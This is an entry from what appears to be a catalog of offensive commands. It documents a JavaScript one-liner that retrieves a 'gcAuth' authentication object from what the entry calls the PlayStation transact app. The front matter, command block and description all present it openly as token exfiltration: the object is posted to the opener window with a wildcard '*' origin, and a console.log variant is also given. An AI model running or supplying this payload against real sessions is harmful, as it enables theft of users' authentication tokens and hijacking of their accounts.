---
id: cmd-retrieve-gcAuth-900619
data: >-
  valkyrie.transact.preflightRunner.getPromise("gcAuth").then((gcAuth)=>
  window.opener.postMessage(JSON.stringify(gcAuth),"*"));
tags:
  - token-retrieval
  - exfil
type: command
output: gcAuth object stringified and posted to opener
executor: javascript
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-13T23:55:20.994Z'
verified: false
validated: true
submitted: true
---
# retrieve-and-post-gcAuth-tokens

## Command

```javascript
valkyrie.transact.preflightRunner.getPromise("gcAuth").then((gcAuth)=> window.opener.postMessage(JSON.stringify(gcAuth),"*"));
```

## Description

Retrieves the gcAuth promise from the PlayStation transact app and posts the resolved authentication object via postMessage to the opener window for exfiltration.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| promiseKey | "gcAuth" for authentication data | Yes |
| targetOrigin | "*" wildcard | Yes |

## Examples

### Basic Usage

```javascript
valkyrie.transact.preflightRunner.getPromise("gcAuth").then((gcAuth)=> console.log(gcAuth));
```

### Advanced Usage

Full exfil as shown, with postMessage.

## Expected Output

Posts JSON string of gcAuth to opener.

## Related

- [[Related Procedure]]
